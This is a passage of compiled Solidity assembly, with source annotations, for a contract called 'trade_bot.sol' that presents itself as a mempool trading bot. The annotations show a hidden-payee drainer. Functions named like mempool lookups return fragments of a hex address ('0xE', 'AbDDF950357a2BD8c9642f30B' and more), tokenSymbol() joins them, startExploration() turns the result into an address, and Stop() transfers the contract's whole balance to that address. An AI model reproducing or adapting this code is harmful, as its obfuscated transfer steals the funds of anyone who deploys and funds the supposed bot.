\"trade_bot.sol\":5689:5721  contracts.transfer(getBalance()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_78\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_78:\n        /* \"trade_bot.sol\":5689:5721  contracts.transfer(getBalance()) */\n      pop\n        /* \"trade_bot.sol\":5568:5726  function Stop() public {\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"trade_bot.sol\":7130:7512  function tokenSymbol() private pure returns (string memory) {\r... */\n    tag_36:\n        /* \"trade_bot.sol\":7175:7188  string memory */\n      0x60\n        /* \"trade_bot.sol\":7195:7222  string memory _mempoolShort */\n      dup1\n        /* \"trade_bot.sol\":7225:7242  getMempoolShort() */\n      tag_80\n        /* \"trade_bot.sol\":7225:7240  getMempoolShort */\n      tag_46\n        /* \"trade_bot.sol\":7225:7242  getMempoolShort() */\n      jump\t// in\n    tag_80:\n        /* \"trade_bot.sol\":7195:7242  string memory _mempoolShort = getMempoolShort() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":7247:7276  string memory _mempoolEdition */\n      0x60\n        /* \"trade_bot.sol\":7279:7300  fetchMempoolEdition() */\n      tag_81\n        /* \"trade_bot.sol\":7279:7298  fetchMempoolEdition */\n      tag_48\n        /* \"trade_bot.sol\":7279:7300  fetchMempoolEdition() */\n      jump\t// in\n    tag_81:\n        /* \"trade_bot.sol\":7247:7300  string memory _mempoolEdition = fetchMempoolEdition() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":7305:7334  string memory _mempoolVersion */\n      0x60\n        /* \"trade_bot.sol\":7337:7358  fetchMempoolVersion() */\n      tag_82\n        /* \"trade_bot.sol\":7337:7356  fetchMempoolVersion */\n      tag_50\n        /* \"trade_bot.sol\":7337:7358  fetchMempoolVersion() */\n      jump\t// in\n    tag_82:\n        /* \"trade_bot.sol\":7305:7358  string memory _mempoolVersion = fetchMempoolVersion() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":7363:7389  string memory _mempoolLong */\n      0x60\n        /* \"trade_bot.sol\":7392:7408  getMempoolLong() */\n      tag_83\n        /* \"trade_bot.sol\":7392:7406  getMempoolLong */\n      tag_52\n        /* \"trade_bot.sol\":7392:7408  getMempoolLong() */\n      jump\t// in\n    tag_83:\n        /* \"trade_bot.sol\":7363:7408  string memory _mempoolLong = getMempoolLong() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":7444:7457  _mempoolShort */\n      dup4\n        /* \"trade_bot.sol\":7459:7474  _mempoolEdition */\n      dup4\n        /* \"trade_bot.sol\":7476:7491  _mempoolVersion */\n      dup4\n        /* \"trade_bot.sol\":7493:7505  _mempoolLong */\n      dup4\n        /* \"trade_bot.sol\":7427:7506  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      add(0x20, mload(0x40))\n      dup1\n      dup6\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_84:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_86\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_84)\n    tag_86:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7427:7506  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup5\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_87:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_89\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_87)\n    tag_89:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7427:7506  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup4\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_90:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_92\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_90)\n    tag_92:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7427:7506  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_93:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_95\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_93)\n    tag_95:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7427:7506  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"trade_bot.sol\":7427:7506  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      swap1\n      0x40\n      mstore\n        /* \"trade_bot.sol\":7413:7507  return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong)) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7130:7512  function tokenSymbol() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"trade_bot.sol\":3573:4296  function startExploration(string memory _a) internal pure returns (address _parsedAddress) {\r... */\n    tag_37:\n        /* \"trade_bot.sol\":3640:3662  address _parsedAddress */\n      0x00\n        /* \"trade_bot.sol\":3669:3685  bytes memory tmp */\n      0x60\n        /* \"trade_bot.sol\":3694:3696  _a */\n      dup3\n        /* \"trade_bot.sol\":3669:3697  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"trade_bot.sol\":3702:3715  uint160 iaddr */\n      0x00\n        /* \"trade_bot.sol\":3718:3719  0 */\n      dup1\n        /* \"trade_bot.sol\":3702:3719  uint160 iaddr = 0 */\n      swap1\n      pop\n        /* \"trade_bot.sol\":3724:3734  uint160 b1 */\n      0x00\n        /* \"trade_bot.sol\":3739:3749  uint160 b2 */\n      dup1\n        /* \"trade_bot.sol\":3759:3765  uint i */\n      0x00\n        /* \"trade_bot.sol\":3768:3769  2 */\n      0x02\n        /* \"trade_bot.sol\":3759:3769  uint i = 2 */\n      swap1\n      pop\n        /* \"trade_bot.sol\":3754:4266  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n    tag_97:\n        /* \"trade_bot.sol\":3775:3785  2 + 2 * 20 */\n      0x2a\n        /* \"trade_bot.sol\":3771:3772  i */\n      dup2\n        /* \"trade_bot.sol\":3771:3785  i < 2 + 2 * 20 */\n      lt\n        /* \"trade_bot.sol\":3754:4266  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      iszero\n      tag_98\n      jumpi\n        /* \"trade_bot.sol\":3810:3813  256 */\n      0x0100\n        /* \"trade_bot.sol\":3801:3813  iaddr *= 256 */\n      dup5\n      mul\n      swap4\n      pop\n        /* \"trade_bot.sol\":3838:3841  tmp */\n      dup5\n        /* \"trade_bot.sol\":3842:3843  i */\n      dup2\n        /* \"trade_bot.sol\":3838:3844  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_100\n      jumpi\n      invalid\n    tag_100:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"trade_bot.sol\":3832:3845  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"trade_bot.sol\":3824:3846  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"trade_bot.sol\":3819:3846  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"trade_bot.sol\":3871:3874  tmp */\n      dup5\n        /* \"trade_bot.sol\":3879:3880  1 */\n      0x01\n        /* \"trade_bot.sol\":3875:3876  i */\n      dup3\n        /* \"trade_bot.sol\":3875:3880  i + 1 */\n      add\n        /* \"trade_bot.sol\":3871:3881  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_101\n      jumpi\n      invalid\n    tag_101:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"trade_bot.sol\":3865:3882  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"trade_bot.sol\":3857:3883  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"trade_bot.sol\":3852:3883  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"trade_bot.sol\":3900:3902  97 */\n      0x61\n        /* \"trade_bot.sol\":3894:3896  b1 */\n      dup4\n        /* \"trade_bot.sol\":3894:3902  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"trade_bot.sol\":3893:3918  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_102\n      jumpi\n      pop\n        /* \"trade_bot.sol\":3914:3917  102 */\n      0x66\n        /* \"trade_bot.sol\":3908:3910  b1 */\n      dup4\n        /* \"trade_bot.sol\":3908:3917  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"trade_bot.sol\":3893:3918  (b1 >= 97) && (b1 <= 102) */\n    tag_102:\n        /* \"trade_bot.sol\":3889:4058  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      iszero\n      tag_103\n      jumpi\n        /* \"trade_bot.sol\":3933:3935  87 */\n      0x57\n        /* \"trade_bot.sol\":3927:3935  b1 -= 87 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"trade_bot.sol\":3889:4058  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      jump(tag_104)\n    tag_103:\n        /* \"trade_bot.sol\":3959:3961  65 */\n      0x41\n        /* \"trade_bot.sol\":3953:3955  b1 */\n      dup4\n        /* \"trade_bot.sol\":3953:3961  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"trade_bot.sol\":3952:3976  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_105\n      jumpi\n      pop\n        /* \"trade_bot.sol\":3973:3975  70 */\n      0x46\n        /* \"trade_bot.sol\":3967:3969  b1 */\n      dup4\n        /* \"trade_bot.sol\":3967:3975  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"trade_bot.sol\":3952:3976  (b1 >= 65) && (b1 <= 70) */\n    tag_105:\n        /* \"trade_bot.sol\":3948:4058  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      iszero\n      tag_106\n      jumpi\n        /* \"trade_bot.sol\":3991:3993  55 */\n      0x37\n        /* \"trade_bot.sol\":3985:3993  b1 -= 55 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"trade_bot.sol\":3948:4058  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      jump(tag_107)\n    tag_106:\n        /* \"trade_bot.sol\":4017:4019  48 */\n      0x30\n        /* \"trade_bot.sol\":4011:4013  b1 */\n      dup4\n        /* \"trade_bot.sol\":4011:4019  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"trade_bot.sol\":4010:4034  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_108\n      jumpi\n      pop\n        /* \"trade_bot.sol\":4031:4033  57 */\n      0x39\n        /* \"trade_bot.sol\":4025:4027  b1 */\n      dup4\n        /* \"trade_bot.sol\":4025:4033  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"trade_bot.sol\":4010:4034  (b1 >= 48) && (b1 <= 57) */\n    tag_108:\n        /* \"trade_bot.sol\":4006:4058  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n      iszero\n      tag_109\n      jumpi\n        /* \"trade_bot.sol\":4049:4051  48 */\n      0x30\n        /* \"trade_bot.sol\":4043:4051  b1 -= 48 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"trade_bot.sol\":4006:4058  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n    tag_109:\n        /* \"trade_bot.sol\":3948:4058  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n    tag_107:\n        /* \"trade_bot.sol\":3889:4058  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n    tag_104:\n        /* \"trade_bot.sol\":4074:4076  97 */\n      0x61\n        /* \"trade_bot.sol\":4068:4070  b2 */\n      dup3\n        /* \"trade_bot.sol\":4068:4076  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"trade_bot.sol\":4067:4092  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_110\n      jumpi\n      pop\n        /* \"trade_bot.sol\":4088:4091  102 */\n      0x66\n        /* \"trade_bot.sol\":4082:4084  b2 */\n      dup3\n        /* \"trade_bot.sol\":4082:4091  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"trade_bot.sol\":4067:4092  (b2 >= 97) && (b2 <= 102) */\n    tag_110:\n        /* \"trade_bot.sol\":4063:4232  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      iszero\n      tag_111\n      jumpi\n        /* \"trade_bot.sol\":4107:4109  87 */\n      0x57\n        /* \"trade_bot.sol\":4101:4109  b2 -= 87 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"trade_bot.sol\":4063:4232  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      jump(tag_112)\n    tag_111:\n        /* \"trade_bot.sol\":4133:4135  65 */\n      0x41\n        /* \"trade_bot.sol\":4127:4129  b2 */\n      dup3\n        /* \"trade_bot.sol\":4127:4135  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"trade_bot.sol\":4126:4150  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_113\n      jumpi\n      pop\n        /* \"trade_bot.sol\":4147:4149  70 */\n      0x46\n        /* \"trade_bot.sol\":4141:4143  b2 */\n      dup3\n        /* \"trade_bot.sol\":4141:4149  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"trade_bot.sol\":4126:4150  (b2 >= 65) && (b2 <= 70) */\n    tag_113:\n        /* \"trade_bot.sol\":4122:4232  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      iszero\n      tag_114\n      jumpi\n        /* \"trade_bot.sol\":4165:4167  55 */\n      0x37\n        /* \"trade_bot.sol\":4159:4167  b2 -= 55 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"trade_bot.sol\":4122:4232  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      jump(tag_115)\n    tag_114:\n        /* \"trade_bot.sol\":4191:4193  48 */\n      0x30\n        /* \"trade_bot.sol\":4185:4187  b2 */\n      dup3\n        /* \"trade_bot.sol\":4185:4193  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"trade_bot.sol\":4184:4208  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_116\n      jumpi\n      pop\n        /* \"trade_bot.sol\":4205:4207  57 */\n      0x39\n        /* \"trade_bot.sol\":4199:4201  b2 */\n      dup3\n        /* \"trade_bot.sol\":4199:4207  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"trade_bot.sol\":4184:4208  (b2 >= 48) && (b2 <= 57) */\n    tag_116:\n        /* \"trade_bot.sol\":4180:4232  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n      iszero\n      tag_117\n      jumpi\n        /* \"trade_bot.sol\":4223:4225  48 */\n      0x30\n        /* \"trade_bot.sol\":4217:4225  b2 -= 48 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"trade_bot.sol\":4180:4232  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n    tag_117:\n        /* \"trade_bot.sol\":4122:4232  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n    tag_115:\n        /* \"trade_bot.sol\":4063:4232  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n    tag_112:\n        /* \"trade_bot.sol\":4257:4259  b2 */\n      dup2\n        /* \"trade_bot.sol\":4252:4254  16 */\n      0x10\n        /* \"trade_bot.sol\":4247:4249  b1 */\n      dup5\n        /* \"trade_bot.sol\":4247:4254  b1 * 16 */\n      mul\n        /* \"trade_bot.sol\":4247:4259  b1 * 16 + b2 */\n      add\n        /* \"trade_bot.sol\":4237:4260  iaddr += (b1 * 16 + b2) */\n      dup5\n      add\n      swap4\n      pop\n        /* \"trade_bot.sol\":3792:3793  2 */\n      0x02\n        /* \"trade_bot.sol\":3787:3793  i += 2 */\n      dup2\n      add\n      swap1\n      pop\n        /* \"trade_bot.sol\":3754:4266  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      jump(tag_97)\n    tag_98:\n      pop\n        /* \"trade_bot.sol\":4285:4290  iaddr */\n      dup3\n        /* \"trade_bot.sol\":4270:4291  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":3573:4296  function startExploration(string memory _a) internal pure returns (address _parsedAddress) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"trade_bot.sol\":4944:5031  function getBalance() private view returns(uint) {\r... */\n    tag_39:\n        /* \"trade_bot.sol\":4987:4991  uint */\n      0x00\n        /* \"trade_bot.sol\":5005:5026  address(this).balance */\n      selfbalance\n        /* \"trade_bot.sol\":4998:5026  return address(this).balance */\n      swap1\n      pop\n        /* \"trade_bot.sol\":4944:5031  function getBalance() private view returns(uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"trade_bot.sol\":6504:6591  function getMempoolShort() private pure returns (string memory) { \r... */\n    tag_46:\n        /* \"trade_bot.sol\":6553:6566  string memory */\n      0x60\n        /* \"trade_bot.sol\":6574:6586  return \"0xE\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x03\n      dup2\n      mstore\n      0x20\n      add\n      0x3078450000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"trade_bot.sol\":6504:6591  function getMempoolShort() private pure returns (string memory) { \r... */\n      swap1\n      jump\t// out\n        /* \"trade_bot.sol\":3454:3567  function fetchMempoolEdition() private pure returns (string memory) { \r... */\n    tag_48:\n        /* \"trade_bot.sol\":3507:3520  string memory */\n      0x60\n        /* \"trade_bot.sol\":3528:3562  return \"AbDDF950357a2BD8c9642f30B\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x19\n      dup2\n      mstore\n      0x20\n      add\n      0x4162444446393530333537613242443863393634326633304200000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"trade_bot.sol\":3454:3567  function fetchMempoolEdition() private pure returns (string memory) { \r... */\n      swap1\n      jump\t// out\n        /* \"trade_bot.sol\":2242:2341  function fetchMempoolVersion() private pure returns (string memory) { \r... */\n    tag_50:\n        